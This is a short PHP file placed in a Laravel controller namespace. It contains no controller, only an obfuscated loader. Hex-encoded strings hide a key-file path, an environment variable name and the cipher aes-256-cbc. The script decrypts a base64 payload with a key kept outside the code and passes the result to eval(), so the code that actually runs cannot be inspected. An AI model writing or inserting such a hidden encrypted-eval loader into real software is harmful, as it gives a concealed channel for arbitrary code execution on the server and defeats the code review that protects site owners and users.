<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('63l4eycs4/8ahkAZbh6vhw==');

$c=base64_decode(

'gQwmkj/vcvFloZCE67TXhkRMzW8tMBkO08HHbVDUPnxPp697HOjII2M0j/CTBwacXmNdQcYY8yBh' .
'ilpqCywOrC0kiu2ybINz+ea50WBXZPsZay2WpX1Psi5z+P0Q1CniNUGzivvkWQy7iXvynCq65pGp' .
'kONwVIagQXBf7Crzy2LOqOsLjR/3WzJrMNnZE1duoXEMHbxrCCS3rjsx24UBMGZoiXonTRS/YXRu' .
'LOK9ZNz0p+8FkjIRGXZdj7mG3yff'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

